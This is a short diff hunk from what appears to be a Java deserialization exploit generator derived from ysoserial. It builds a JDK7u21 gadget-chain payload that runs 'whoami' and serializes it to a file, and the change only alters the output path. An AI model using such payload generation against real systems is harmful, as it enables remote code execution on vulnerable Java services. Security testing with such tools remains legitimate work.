@@ -283,7 +283,7 @@ public class JDK7u21_m {
     	ysoserial.payloads.util.JDK7u21_m exploit = new ysoserial.payloads.util.JDK7u21_m();
         Object payload = exploit.buildPayload("whoami");
 //        // test payload
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("/Users/0x101/safe/mytools_10012106/myhktools/payload/8848.bin"));
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("./8848.bin"));
         oos.writeObject(payload);
         oos.close();
 //        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("./calc.bin"));
